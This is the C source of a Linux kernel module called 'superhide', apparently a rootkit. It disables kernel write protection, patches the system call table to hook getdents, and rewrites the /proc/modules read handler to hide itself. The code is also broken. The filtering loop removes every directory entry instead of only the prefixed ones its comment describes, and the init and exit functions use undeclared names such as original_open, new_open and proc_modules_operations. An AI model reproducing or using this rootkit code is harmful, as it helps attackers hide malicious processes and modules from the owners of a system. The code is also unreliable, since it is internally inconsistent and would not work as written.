#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include <linux/fs.h>

#define GETDENTS_SYSCALL_NUM	78
#define WRITE_PROTECT_FLAG	(1<<16)
#define MODULE_NAME		"superhide"
#define MODULE_NAME_SZ		(sizeof(MODULE_NAME) - 1)

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

// function type for the getdents handler function
typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
// the original handler
sys_getdents_t sys_getdents_orig = NULL;

// function type for the proc modules read handler
typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
// the original read handler
proc_modules_read_t proc_modules_read_orig = NULL;


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alireza Isavand");
MODULE_DESCRIPTION("Hooking open system call.");
MODULE_VERSION("0.01");



void** sys_call_table_ptr;


// our new getdents handler
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = sys_getdents_orig(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		// remove this entry by copying everything after it forward
		memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
		// and adjust the length reported
		ret -= ent->d_reclen;

	}
	return ret;
}

// our new /proc/modules read handler
ssize_t proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff_t *offset) {
	char* bad_line = NULL;
	char* bad_line_end = NULL;
	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
	// search in the buf for MODULE_NAME, and remove that line
	bad_line = strnstr(buf, MODULE_NAME, ret);
	if (bad_line != NULL) {
		// find the end of the line
		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
			if (*bad_line_end == '\n') {
				bad_line_end++; // go past the line end, so we remove that too
				break;
			}
		}
		// copy over the bad line
		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
		// adjust the size of the return value
		ret -= (ssize_t)(bad_line_end - bad_line);
	}
	
	return ret;
}

static int __init open_hook_init(void){
        printk(KERN_INFO "Module started.\n");
        write_cr0(read_cr0() & (~0x10000));
        sys_call_table_ptr = (void*) kallsyms_lookup_name("sys_call_table");
        
        original_open = sys_call_table_ptr[GETDENTS_SYSCALL_NUM];
        sys_call_table_ptr[GETDENTS_SYSCALL_NUM] = new_open;
        
		proc_modules_read_orig = proc_modules_operations->read;
        proc_modules_operations->read = proc_modules_read_new;
        
		write_cr0(read_cr0() | (0x10000));
        return 0;
}

static void __exit open_hook_exit(void){
        write_cr0(read_cr0() & (~0x10000));
        sys_call_table_ptr[GETDENTS_SYSCALL_NUM] = original_open;
        proc_modules_operations->read = proc_modules_read_orig;
        write_cr0(read_cr0() | (0x10000));
        printk(KERN_INFO "Module ends.\n");
}

module_init(open_hook_init);
module_exit(open_hook_exit);

